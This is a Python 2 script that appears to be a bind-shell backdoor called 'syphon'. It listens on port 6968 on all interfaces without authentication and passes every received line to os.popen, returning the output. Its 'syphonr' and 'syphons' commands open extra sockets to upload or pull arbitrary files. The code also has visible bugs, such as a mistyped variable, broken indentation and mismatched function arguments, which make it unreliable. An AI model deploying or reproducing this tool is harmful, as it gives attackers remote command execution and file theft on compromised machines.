import os, signal
import socket
import subprocess, threading
from time import sleep

host = "0.0.0.0"
port = 6968
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(5)
c = ""

def shutdown_recv(rhost, rport):
	rs.close = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	rsclose.connect((rhost, rport))
	rsclose.close()

def shutdown_send(shost, sport):
	ssclose = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ssclose.connect((shost, sport))
	ssclose.close()

def shutdown_server(c, s):
	try:
		c.close()
	except AttributeError as aer:
		print aer
	s.close()
	exit(0)

def signal_handler(signal, frame):
	try:
		if send_thread.isAlive():
			shutdown_send(shost, sport)
	except NameError as ner:
		print ner
	try:
		if recv_thread.isAlive():
			shutdown_recv(rhost, rport)
	except NameError as ner:
		print ner
	shutdown_server(c, s)

def recv_server(rhost, rport, rpath):
	rpath = rpath.rstrip('\n')
	try:
		recv_file = open(rpath, "w")
	except IOError as rerr:
		print rerr
        rs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       	rs.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
       	rs.bind((rhost, rport))
       	rs.listen(1)
        rc, raddr = rs.accept()
        while True:
		rdata = rc.recv(8192)
		if not rdata: break
		recv_file.write(rdata)
	recv_file.close()
	rc.close()
	rs.close()

def send_server(shost, sport, spath):
	spath = spath.rstrip('\n')
	try:
		send_file = open(spath, "r")
	except IOError as serr:
		print serr
        ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       	ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
       	ss.bind((shost, sport))
       	ss.listen(1)
        sc, saddr = ss.accept()
        for line in send_file.readlines():
			sc.send(line)
	send_file.close()
	sc.close()
	ss.close()

def server(s, c):
	while True:
		c, addr = s.accept()
		rcmand = c.recv(128)
		if "syphonr" in rcmand:
			opts = rcmand.split(" ")
			try:
				rpath = opts.pop()
				rport = opts.pop()
				rhost = opts.pop()
			except IndexError as ier:
				print ier
			try:
				rport = int(rport)
			except ValueError as ver:
				print ver
			if 'rpath' in locals() and 'rport' in locals() and 'rhost' in locals():
				recv_thread = threading.Thread(target=recv_server, args=(rhost, rport, rpath,))	
				recv_thread.daemon = True
				recv_thread.start()
				c.send("Syphon receive server started successfully\n")
				rcmand = ""
		elif "syphons" in rcmand:
			opts = rcmand.split(" ")
			try:
				spath = opts.pop()
				sport = opts.pop()
				shost = opts.pop()
			except IndexError as ier:
				print ier
			try:
				sport = int(sport)
			except ValueError as ver:
				print ver
			if 'spath' in locals() and 'sport' in locals() and 'shost' in locals():
				send_thread = threading.Thread(target=send_server, args=(shost, sport, spath,))
				send_thread.daemon = True
				send_thread.start()
				c.send("Syphon send server started successfully\n")
				rcmand = ""
		elif "syphon exit" in rcmand:
			if 'spath' in locals() and 'sport' in locals() and 'shost' in locals():
				shutdown_send(ss, shost, sport)
			if 'rpath' in locals() and 'rport' in locals() and 'rhost' in locals():
				shutdown_recv(rs, rhost, rport)
			shutdown_server(c, s)
		else:
           		output = os.popen(rcmand).read()
               		c.send(output)
	c.close()
	s.close()

signal.signal(signal.SIGINT, signal_handler)

server(s, c)
